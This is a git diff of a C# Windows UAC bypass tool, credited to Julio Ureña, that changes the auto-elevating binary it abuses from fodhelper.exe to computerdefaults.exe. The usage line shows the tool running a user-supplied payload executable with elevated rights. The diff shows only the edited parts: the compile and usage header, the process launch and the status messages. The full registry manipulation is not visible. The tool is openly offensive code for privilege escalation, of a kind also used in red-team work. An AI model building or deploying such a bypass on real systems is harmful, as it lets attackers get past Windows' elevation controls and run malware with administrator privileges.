@@ -3,8 +3,8 @@ Created by: Julio Ureña (plaintext)
 Twitter: @JulioUrena
 Website: https://plaintext.do
 
-Compile: csc.exe uac_bypass_fodhelper.cs
-Usage: uac_bypass_fodhelper.exe C:\Path\To\Payload.exe
+Compile: csc.exe uac_bypass_computerdefaults.cs
+Usage: uac_bypass_computerdefaults.exe C:\Path\To\Payload.exe
 */
 
 using System;
@@ -66,18 +66,18 @@ namespace UAC_Bypass
 				startInfo.CreateNoWindow = true;
 				startInfo.UseShellExecute = false;
                 startInfo.FileName = "cmd.exe";
-                startInfo.Arguments = @"/c start fodhelper.exe";
+                startInfo.Arguments = @"/c start computerdefaults.exe";
                 Process.Start(startInfo);
 
                 Console.WriteLine("[+] UAC Bypass Application Executed.");
             }
             catch
             {
-                Console.WriteLine("[-] Unable to Execute the Application fodhelper.exe to perform the bypass.");
+                Console.WriteLine("[-] Unable to Execute the Application computerdefaults.exe to perform the bypass.");
             }
 			
 			DeleteKey();
-            Console.WriteLine("[-] Exit."); 
+            Console.WriteLine("[-] Exit.");            
         }
 
         static void DeleteKey()
